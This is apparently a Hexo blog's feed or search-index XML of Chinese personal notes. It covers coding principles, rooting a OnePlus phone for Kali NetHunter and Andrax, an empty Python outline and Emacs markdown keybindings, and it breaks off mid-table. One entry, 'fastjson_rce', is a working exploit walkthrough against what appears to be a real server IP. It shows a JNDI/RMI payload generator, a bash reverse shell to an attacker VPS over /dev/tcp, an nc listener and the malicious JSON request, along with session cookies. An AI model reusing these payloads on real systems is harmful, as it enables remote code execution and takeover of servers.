      <title>code_of_principle</title>
      <link href="Coding/code-of-principle.html"/>
      <url>Coding/code-of-principle.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><a href="https://zh-google-styleguide.readthedocs.io/en/latest/contents/">谷歌代码规范</a></p><p>编程属于设计行为，负责制造的是编译器或者构建系统<br>程序员的能力是用来为用户创造价值的</p><h1 id="How-to-code"><a href="#How-to-code" class="headerlink" title="How to code"></a>How to code</h1><p>文学编程(代码即设计文档) 用于表述文档的语言和编程语言结合在了一起<br>高质量代码三大特性：可读性 &gt; 简洁性 &gt; 灵活性</p><ul><li><input disabled="" type="checkbox"> 可读性 第一要务</li><li><input disabled="" type="checkbox"> 简洁性 保持代码简洁，不写多余的代码，不写重复的代码</li><li><input disabled="" type="checkbox"> 灵活性 添加新代码时，与已有代码不冲突、不排斥<br>高质量代码是拥有多种扩展方法、不存在多余要素、可读性高、易于理解的代码。 </li></ul><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>“插件式”软件架构</p><ul><li>非功能需求<br>非功能对开发、运维、计算机资源的高校运用有较大影响，在发布后的运维阶段，比较大的问题多是由性能、系统宕机等非功能需求引起的。</li></ul><h2 id="再版-重构"><a href="#再版-重构" class="headerlink" title="再版-重构"></a>再版-重构</h2><blockquote><p>在不改变代码外部行为的前提下，对代码内部结构进行优化，亦称代码体质优化</p></blockquote><p>重构的征兆:</p><ul><li><input disabled="" type="checkbox"> 代码重复、命名不一致</li><li><input disabled="" type="checkbox"> 函数体太长</li><li><input disabled="" type="checkbox"> 模块规模太大、太多</li></ul><h2 id="图书-包"><a href="#图书-包" class="headerlink" title="图书-包"></a>图书-包</h2><p>包：一种方便组织代码的机制(实现封装和模块化开发)，类似于文件夹，还可以解决命令冲突问题。<br>等模块积攒到一定数量之后再自上而下的将模块按照某种有意义的单位整理并分割</p><h2 id="章节-模块"><a href="#章节-模块" class="headerlink" title="章节-模块"></a>章节-模块</h2><p>针对借口编程，而不是针对实现编程</p><p>模块化：让修改模块所带来的影响停留在改模块内部<br>模块间互相频繁调用表明折俩函数应放在一个模块</p><p>抽象： 舍弃多余的东西，抽取对象共同的性质组成通用的概念</p><p>Parnas原则：</p><ul><li>对于模块的使用者，仅提供使用该模块锁必需的所有信息，其余信息概不提供</li><li>对模块的开发者，仅提供实现该模块所必需的所有信息，其余信息概不提供</li></ul><p>关注点分离： 将各个与关注点有关的代码集中起来做成独立的模块，与其他代码分离。如MVC模型，AOP(面向切面编程)</p><p>OCP开闭原则: 对扩展开发、对修改关闭 面向对象的多态性是实现OCP的代表技术</p><ul><li>内聚度: 单个模块内的功能的纯粹程度</li><li>耦合度: 衡量模块间关系紧密程度 模块间仅通过参数传递标量类型的数据作为模块间的接口</li></ul><p>模块应以实现高内聚、低耦合的模块为目标</p><h2 id="序言-注释"><a href="#序言-注释" class="headerlink" title="序言-注释"></a>序言-注释</h2><p>注释的目的是帮值阅读代码的人了解作者写代码时的思想</p><p> 代码只能表达“What”、“How” 、注释表达“Why”<br> 注释内容要简洁明了，防止注释二义性</p><h3 id="模块注释"><a href="#模块注释" class="headerlink" title="模块注释"></a>模块注释</h3><pre><code class="zsh"># File Name: xxx# Author: Mr.Frame# Version: 0.1# Date: # Description: ### Function List:</code></pre><h3 id="函数注释"><a href="#函数注释" class="headerlink" title="函数注释"></a>函数注释</h3><pre><code class="zsh"># Function: # Description: ## Input: # Output:# Return: # Call: # Called by: # Others:</code></pre><h3 id="代码注释"><a href="#代码注释" class="headerlink" title="代码注释"></a>代码注释</h3><p>注释应放在代码上方/或/右方</p><h2 id="目录-函数"><a href="#目录-函数" class="headerlink" title="目录-函数"></a>目录-函数</h2><p>将代码分割成级别统一的函数，函数一览起到目录的作用</p><p>复合函数： 将函数结构化，各函数的处理将以调用比自己低一个级别的函数为中心<br>不要在复合函数中调用不同抽象级别的函数，<br>一个函数中不能既有连接数据库(低级处理)、又有执行业务逻辑(高级处理)</p><p>将关系紧密的代码集中在一起函数化，同时保证关联性较弱的代码互不依赖</p><p>通用过滤器：接收某种数据流后，经过加工输出文本格式的数据流</p><p>函数行数不过百，仅输出重要信息</p><p>防御性编程:</p><ul><li><input disabled="" type="checkbox"> 确认外部代码传来的数据输入值(有效范围、字符串长度)</li><li><input disabled="" type="checkbox"> 确认参数的值(检测无效输入)</li></ul><h2 id="段落-代码块"><a href="#段落-代码块" class="headerlink" title="段落-代码块"></a>段落-代码块</h2><p>正交性: 代码之间应具有独立性和分离性(例如：访问数据库代码和用户接口代码)</p><p>代码块内列对齐</p><p>不同的代码块之间有空行</p><blockquote><p>数据常量化<br>对代码的逻辑进行函数化、模块化</p></blockquote><p>比较操作时，把改变的值放在左边，把稳定的值放在右边</p><p>将逻辑和该逻辑处理的数据放在相近的位置</p><p>处理流程尽量走直线,不使用条件分支</p><p>每个控制条件都存在与之成对的反条件，<br>保证控制条件具有统一性：<br>即便某个if语句一定成立，也要考虑else语句的情况<br>即便某个case语句一定成立，也要考虑default语句的情况<br>即使某个变量不可能为空，也要检查该变量是否为NULL</p><h2 id="正文-代码"><a href="#正文-代码" class="headerlink" title="正文-代码"></a>正文-代码</h2><p>命名：名字是面向代码阅读者的用户界面。名字说明的是效果和目的，不是手段， </p><ul><li><p>使用专业具体含义的词</p></li><li><p>全局变量名较长，局部变量名较短</p></li><li><p>恰当使用大小写和下划线</p></li><li><p>减少变量作用域</p></li></ul><ul><li><input disabled="" type="checkbox"> 表示范围: max/min 、first/last 、begin/end</li><li><input disabled="" type="checkbox"> 表示bool: is/has</li></ul><h2 id="注释-索引-Editor自带"><a href="#注释-索引-Editor自带" class="headerlink" title="注释/索引-Editor自带"></a>注释/索引-Editor自带</h2><p>图书中有注释和索引，但IDE和编辑器的跳转和搜索功能可以满足这部分需求。</p><ul><li>「编程的原则：改善代码质量的101个方法」</li></ul><h1 id="How-to-read"><a href="#How-to-read" class="headerlink" title="How to read"></a>How to read</h1><p>代码阅读是一项机会主义、以目标为导向的思维活动。<br>在大多数情况下，我们无法承担阅读和理解整个软件系统代码的代价，<br>任何试图对代码进行精确分析的想法，都会导致陷入大量的类、文件和模块中。<br>因此，<strong>我们必须积极低减少必须理解的代码</strong></p><ul><li><input disabled="" type="checkbox"> 学习编写伟大代码的方式: 阅读大量优质代码<br>阅读优秀源码基础:</li><li><input disabled="" type="checkbox"> 设计模式</li><li><input disabled="" type="checkbox"> 算法、数据结构</li></ul><p>在熟悉基本的编程和计算机科学概念后，通过阅读一套设计良好的软件系统的内部细节<br>    可以学到新颖的架构模式、数据结构、编码方法、算法、风格和文档规范、API、甚至一门新的计算机语言。</p><ul><li><input disabled="" type="checkbox"> 良好习惯: 有目标地阅读辨认编写的高质量代码(遇到库元素就阅读库文档)</li></ul><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><ul><li><input disabled="" type="checkbox"> 阅读README，安装依赖，编译运行,编译不成功不读</li><li><input disabled="" type="checkbox"> 主框架,阅读main函数，梳理主逻辑<ul><li><input disabled="" type="checkbox"> a. 函数调用顺序、及其参数</li><li><input disabled="" type="checkbox"> b. </li></ul></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali_nethunter and Andrax</title>
      <link href="Kali/kali-nethunter_and_Andrax.html"/>
      <url>Kali/kali-nethunter_and_Andrax.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Kali-Nethunter"><a href="#Kali-Nethunter" class="headerlink" title="Kali Nethunter"></a>Kali Nethunter</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>安装android-plateform-tools <code>brew install android-platform-tools</code></p></li><li><p>三个zip包</p><ul><li>[TWRP for 10](<a href="https://dl.twrp.me/guacamole/%EF%BC%89">https://dl.twrp.me/guacamole/）</a></li><li><a href="https://github.com/topjohnwu/Magisk/releases/download/v21.4/Magisk-v21.4.zip">Magisk</a></li><li><a href="https://zackptg5.com/downloads/Disable_Dm-Verity_ForceEncrypt_11.02.2020.zip">Disable-Dm-Verity_ForceEncrypt</a><br>可选</li></ul></li><li><p><a href="https://www.huaweicentral.com/download-latest-google-play-store-application-apk/#google_vignette">谷歌框架</a></p><h2 id="刷入"><a href="#刷入" class="headerlink" title="刷入"></a>刷入</h2></li><li><p>设置-&gt;系统-&gt;开发者模式界面，开启<strong>OEM解锁</strong>、<strong>USB调试</strong>两个个选项</p></li><li><p>手机链接电脑运行如下命令</p><pre><code class="zsh">adb reboot bootloader                                       # 进入fastboot模式fastboot oem unlock                                         # 解锁，手机出现解锁界面，用音量键选择UNLOCK THE BOOTLOADER，电源键确认fastboot boot twrp-3.x.x.x.img                              # 刷入twrp镜像,等待几秒进入临时twrp模式adb push twrp-3.x.x.zip /sdcard                             # 上传twrp的zip包，并刷入twrp镜像,adb reboot recovery                                         # 重启到recovery模式adb push Magisk-vx.zip                                      # 上传Magisk包并刷入adb push Disable_Dm-Verify-ForceEncrypt_xx.zip /sdcard      # 解锁Data分区，上传Disable_Dm-Verity-ForceEncrypt并刷入adb reboot                                                  # 重启，进行初始化设置adb push nethunter-2021.1-oneplus7-oos-ten-kalifs-full.zip  # 上传kali nethunter镜像并刷入adb reboot                                                  # 重启</code></pre></li></ul><p><img src="../images/nethunter.jpg" alt="kali nethunter"></p><h2 id="关闭系统更新提示"><a href="#关闭系统更新提示" class="headerlink" title="关闭系统更新提示"></a>关闭系统更新提示</h2><pre><code class="zsh">adb shell pm disable-user com.oneplus.opbackup    # 屏蔽更新adb shell pm clear com.oneplus.opbackup           # 清除通知adb shell enable com.oneplus.opbackup             # 恢复更新</code></pre><h2 id="升级系统保留ROOT权限操作"><a href="#升级系统保留ROOT权限操作" class="headerlink" title="升级系统保留ROOT权限操作"></a>升级系统保留ROOT权限操作</h2><p><a href="https://cyhour.com/1233/">一加7T如何保留ROOT OTA升级系统</a><br><a href="https://koonchung.github.io/post/2020-05-07/">一加7 OTA升级保留ROOT</a></p><h1 id="Andrax"><a href="#Andrax" class="headerlink" title="Andrax"></a><a href="https://andrax.thecrackertechnology.com/">Andrax</a></h1><p><a href="https://andrax.thecrackertechnology.com/documentation/">Andrax文档</a></p><p><a href="https://gitlab.com/crk-mythical/andrax-hackers-platform-v5-2">Andrax仓库</a></p><p>下载<a href="https://download2347.mediafire.com/dj83upef4o5g/xvxo6hw9i99kdcn/ANDRAX-Mobile.zip">Andrax-mobile.zip</a><br>手机连接电脑输入</p><pre><code class="zsh">unzip ANDRAX-Mobile.zip adb push andraxcorev6001.tar.xz.cpt /sdcard/Downloadadb install ANDRAXMobile6001.apkadb shell pm list packages  # 查看所有包adb shell dumpsys activity  com.thecrackertechnology.andrax  # 获取指定包的Activityadb shell am start -n com.thecrackertechnology.andrax/com.thecrackertechnology.dragonterminal.ui.term.NeoTermActivity  # 点击”OK“</code></pre><p>root和andrax默认密码<code>andrax</code><br><img src="../images/andrax-1.jpg" alt="Andrax"></p><p><img src="../images/andrax-2.jpg" alt="Andrax"></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><pre><code class="zsh">sudo service --status-allsudo service ssh start</code></pre><h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><pre><code class="zsh">sudo service vnc startvnc-viewer 192.168.43.73:5901</code></pre><h2 id="Bluetooth-Hacking"><a href="#Bluetooth-Hacking" class="headerlink" title="Bluetooth Hacking"></a>Bluetooth Hacking</h2><ol><li><p>open Andrax Terminal with Recovery shell</p><pre><code class="zsh">sucd /;cat *.rc | grep -i &quot;bluetooth&quot; | grep -i &quot;net_bt_stack&quot; | grep -i &quot;\/dev&quot;  # 定位串口</code></pre><p>输出<br> chown bluetooth net_bt_stack <strong>/dev/ttyS0</strong></p></li><li><p>open Andrax Terminal</p><pre><code class="zsh">sudo stty -F /dev/ttyS0  # 查看串口速率sudo hciattach -s 115200 /dev/ttyS0 any 3000000   # 创建接口sudo hciconfig hci0 up  # 激活接口</code></pre></li></ol><p>参考<br><a href="https://www.zerozd.xyz/Android/67.html">一加7基于安卓10版本安装NetHunter</a><br><a href="https://www.blackh4t.org/oneplus7pro-kali-nethunter/">一加7Pro把玩Nethunter</a><br><a href="https://www.oneplusbbs.com/thread-4446250-1.html">就砖</a><br><a href="https://www.oneplusbbs.com/forum.php?mod=viewthread&tid=4065238">TWRP备份与还原操作</a><br><a href="https://www.xiaoyuanjiu.com/9093.html">TWRP备份与还原操作2</a></p><p><a href="https://www.anquanke.com/post/id/223493">Andrax和nethunter介绍</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python-basic</title>
      <link href="Coding/python-basic.html"/>
      <url>Coding/python-basic.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p> 基础语法及关键字</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>类型是编译器用来分配存储空间的模板，</p><h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><p>变量是编译器分配给的内存地址(0x0000~0xffff)的别名</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>and/or短路逻辑: 表达式从左至右运算</li><li><input disabled="" type="checkbox"> ( A or B and C or D)，仅当A(or的左侧逻辑值)为True，则短路其后所有表达式</li><li><input disabled="" type="checkbox"> ( A and B and C or D), 仅当A(and左侧逻辑值)为False，则短路其后所有表达式</li></ul><h2 id="流程控制及异常处理"><a href="#流程控制及异常处理" class="headerlink" title="流程控制及异常处理"></a>流程控制及异常处理</h2><h3 id="顺序语句"><a href="#顺序语句" class="headerlink" title="顺序语句"></a>顺序语句</h3><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><h4 id="if型"><a href="#if型" class="headerlink" title="if型"></a>if型</h4><h4 id="case型"><a href="#case型" class="headerlink" title="case型"></a>case型</h4><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><h4 id="for型"><a href="#for型" class="headerlink" title="for型"></a>for型</h4><h4 id="while型"><a href="#while型" class="headerlink" title="while型"></a>while型</h4><h4 id="until型"><a href="#until型" class="headerlink" title="until型"></a>until型</h4><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><h1 id="进阶知识"><a href="#进阶知识" class="headerlink" title="进阶知识"></a>进阶知识</h1><h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><h2 id="编程思想"><a href="#编程思想" class="headerlink" title="编程思想"></a>编程思想</h2><h2 id="开源类库"><a href="#开源类库" class="headerlink" title="开源类库"></a>开源类库</h2><h2 id="开源框架"><a href="#开源框架" class="headerlink" title="开源框架"></a>开源框架</h2><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fastjson_rce</title>
      <link href="Kali/Exploit/fastjson-rce.html"/>
      <url>Kali/Exploit/fastjson-rce.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="漏洞url"><a href="#漏洞url" class="headerlink" title="漏洞url"></a>漏洞url</h1><p><a href="http://x.x.x.x/demo/login">http://x.x.x.x/demo/login</a> </p><pre><code class="shell">POST /demo/login HTTP/1.1Host: x.x.x.xContent-Length: 35Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Content-Type: application/jsonOrigin: http://106.14.21.5:31180Referer: http://106.14.21.5:31180/demo/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510Connection: close&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</code></pre><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="在vps-47-106-65-x-上生成payload"><a href="#在vps-47-106-65-x-上生成payload" class="headerlink" title="在vps(47.106.65.x)上生成payload"></a>在vps(47.106.65.x)上生成payload</h2><p><a href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_tool.jar</a></p><pre><code class="shell">java -cp /tmp/fastjson_tool.jar fastjson.HRMIServer 47.106.65.x 1099 &quot;bash=bash -i &gt;&amp; /dev/tcp/47.106.65.x/9999 0&gt;&amp;1&quot;[-] payload:  &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;[-] payload:  &#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;[-] Opening JRMP listener on 1099...</code></pre><h2 id="在vps上监听999端口"><a href="#在vps上监听999端口" class="headerlink" title="在vps上监听999端口"></a>在vps上监听999端口</h2><pre><code class="shell">nc -lvvp 999</code></pre><h2 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h2><pre><code class="shell">POST /demo/login HTTP/1.1Host: x.x.x.xContent-Length: 184Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Content-Type: application/jsonOrigin: http://x.x.x.xReferer: http://x.x.x.x/demo/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510Connection: close&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Markdown_of_Emacs</title>
      <link href="Evolution/Markdown-of-Emacs.html"/>
      <url>Evolution/Markdown-of-Emacs.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="安装markdown-mode"><a href="#安装markdown-mode" class="headerlink" title="安装markdown-mode"></a>安装<a href="https://jblevins.org/projects/markdown-mode/" title="官网">markdown-mode</a></h1><h2 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h2><pre><code class="shell">brew install markdown pandoc multimarkdown</code></pre><pre><code class="emacs-lisp">(use-package markdown-mode  :ensure t  :commands (markdown-mode gfm-mode)  :mode ((&quot;README\\.md\\&#39;&quot; . gfm-mode)         (&quot;\\.md\\&#39;&quot; . markdown-mode)         (&quot;\\.markdown\\&#39;&quot; . markdown-mode))  :init (setq markdown-command          (concat           &quot;/usr/local/bin/pandoc&quot;           &quot; --from=markdown --to=html&quot;           &quot; --standalone --mathjax --highlight-style=pygments&quot;)))</code></pre><h2 id="前缀键"><a href="#前缀键" class="headerlink" title="前缀键"></a>前缀键</h2><table><thead><tr><th align="center">Prefix</th><th align="center">Function</th></tr></thead><tbody><tr><td align="center">C-c C-s</td><td align="center">样式类</td></tr><tr><td align="center">C-c C-l</td><td align="center">链接</td></tr><tr><td align="center">C-c C-i</td><td align="center">图片</td></tr><tr><td align="center">C-c C-c</td><td align="center">命令类</td></tr><tr><td align="center">C-c C-x</td><td align="center">开关类</td></tr></tbody></table><h2 id="标记区域和移动"><a href="#标记区域和移动" class="headerlink" title="标记区域和移动"></a>标记区域和移动</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">标记段落</td><td align="center">M-h</td><td align="center"></td></tr><tr><td align="center">下一段</td><td align="center">M-}</td><td align="center"></td></tr><tr><td align="center">上一段</td><td align="center">M-{</td><td align="center"></td></tr><tr><td align="center">标记块</td><td align="center">C-c M-h</td><td align="center"></td></tr><tr><td align="center">下一块</td><td align="center">C-M-}</td><td align="center"></td></tr><tr><td align="center">上一块</td><td align="center">C-M-{</td><td align="center"></td></tr><tr><td align="center">标记section</td><td align="center">C-M-h</td><td align="center"></td></tr><tr><td align="center">标记子标题区域</td><td align="center">C-c C-M-h</td><td align="center"></td></tr><tr><td align="center">右移</td><td align="center">C-c &gt;</td><td align="center"></td></tr><tr><td align="center">左移</td><td align="center">C-c &lt;</td><td align="center"></td></tr></tbody></table><h2 id="预览和导出"><a href="#预览和导出" class="headerlink" title="预览和导出"></a>预览和导出</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">编译</td><td align="center">C-c C-c m</td><td align="center"></td></tr><tr><td align="center">预览</td><td align="center">C-c C-c p</td><td align="center"></td></tr><tr><td align="center">导出</td><td align="center">C-c C-c e</td><td align="center"></td></tr><tr><td align="center">导出+预览</td><td align="center">C-c C-c v</td><td align="center"></td></tr><tr><td align="center">打开</td><td align="center">C-c C-c o</td><td align="center"></td></tr><tr><td align="center">实时导出</td><td align="center">C-c C-c l</td><td align="center"></td></tr></tbody></table><h1 id="Markdown-语法"><a href="#Markdown-语法" class="headerlink" title="Markdown 语法"></a>Markdown 语法</h1><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">快捷键列表</td><td align="center">C-c C-h C-h</td><td align="center"></td></tr><tr><td align="center">折叠/展开</td><td align="center">TAB</td><td align="center"></td></tr><tr><td align="center">移动到父级标题</td><td align="center">C-c C-u</td><td align="center"></td></tr><tr><td align="center">移动到标题上一个</td><td align="center">C-c C-p</td><td align="center"></td></tr><tr><td align="center">移动到标题下一个</td><td align="center">C-c C-n</td><td align="center"></td></tr><tr><td align="center">移动到同级标题上一个</td><td align="center">C-c C-b</td><td align="center"></td></tr><tr><td align="center">移动到同级标题下一个</td><td align="center">C-c C-f</td><td align="center"></td></tr></tbody></table><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">自动设置标题</td><td align="center">C-c C-s h/H</td><td align="center"></td></tr><tr><td align="center">插入n级标题</td><td align="center">C-c C-s/t &lt;n&gt;</td><td align="center"></td></tr><tr><td align="center">上移标题</td><td align="center">C-c &lt;up&gt;</td><td align="center"></td></tr><tr><td align="center">下移标题</td><td align="center">C-c &lt;down&gt;</td><td align="center"></td></tr><tr><td align="center">升级标题</td><td align="center">C-c &lt;left&gt;</td><td align="center"></td></tr><tr><td align="center">降级标题</td><td align="center">C-c &lt;right&gt;</td><td align="center"></td></tr><tr><td align="center">水平分割线</td><td align="center">C-c C-s -</td><td align="center"></td></tr></tbody></table><h2 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">斜体</td><td align="center">C-c C-s i/e</td><td align="center"></td></tr><tr><td align="center">粗体</td><td align="center">C-c C-s b</td><td align="center"></td></tr><tr><td align="center"><kbd>标签</td><td align="center">C-c C-s k</td><td align="center"></td></tr><tr><td align="center">高亮</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">删除线</td><td align="center">C-c C-s s</td><td align="center"></td></tr><tr><td align="center">引用</td><td align="center">C-c C-s q</td><td align="center"></td></tr></tbody></table><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">URL</td><td align="center">C-c C-l</td><td align="center">markdown-insert-link</td></tr><tr><td align="center">Image</td><td align="center">C-c C-i</td><td align="center">markdwon-insert-image</td></tr><tr><td align="center">显示/关闭图片</td><td align="center">C-c C-x C-i</td><td align="center">markdown-toggle-inline-images</td></tr><tr><td align="center">打开URL</td><td align="center">C-c C-o</td><td align="center">markdown-follow-thing-at-point</td></tr><tr><td align="center">下一个链接</td><td align="center">M-n</td><td align="center"></td></tr><tr><td align="center">上一个链接</td><td align="center">M-p</td><td align="center"></td></tr></tbody></table><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><table><thead><tr><th align="center">语法</th><th align="center">keybinding</th></tr></thead><tbody><tr><td align="center">行内代码</td><td align="center">C-c C-s c</td></tr><tr><td align="center">代码块</td><td align="center">C-c C-s C</td></tr><tr><td align="center">编辑块</td><td align="center">C-c ‘</td></tr><tr><td align="center">开/关代码颜色</td><td align="center">C-c C-x C-f</td></tr></tbody></table><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">插入</td><td align="center">C-c C-j</td><td align="center"></td></tr><tr><td align="center">上移</td><td align="center">C-c &lt;up&gt;</td><td align="center"></td></tr><tr><td align="center">下移</td><td align="center">C-c &lt;down&gt;</td><td align="center"></td></tr><tr><td align="center">列右移</td><td align="center">C-c &lt;right&gt;</td><td align="center"></td></tr><tr><td align="center">列左移</td><td align="center">C-c &lt;left&gt;</td><td align="center"></td></tr></tbody></table><h2 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center"></td><td align="center">C-c C-d</td><td align="center"></td></tr></tbody></table><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><table><thead><tr><th align="center">语法</th><th align="center">keybindings</th><th>function</th></tr></thead><tbody><tr><td align="center">插入表格</td><td align="center">C-c C-s t</td><td></td></tr><tr><td align="center">行上移</td><td align="center">C-c &lt;up&gt;</td><td></td></tr><tr><td align="center">行下移</td><td align="center">C-c &lt;down&gt;</td><td></td></tr><tr><td align="center">列左移</td><td align="center">C-c &lt;left&gt;</td><td></td></tr><tr><td align="center">列右移</td><td align="center">C-c &lt;right&gt;</td><td></td></tr><tr><td align="center">删除行</td><td align="center">C-c &lt;S-up&gt;</td><td></td></tr><tr><td align="center">插入行</td><td align="center">C-c &lt;S-down&gt;</td><td></td></tr><tr><td align="center">删除列</td><td align="center">C-c &lt;S-left&gt;</td><td></td></tr><tr><td align="center">插入列</td><td align="center">C-c &lt;S-right&gt;</td><td></td></tr><tr><td align="center">行排序</td><td align="center">C-c C-c ^</td><td></td></tr><tr><td align="center">表格转置</td><td align="center">C-c C-c t</td><td></td></tr><tr><td align="center">区域转表</td><td align="center">C-c 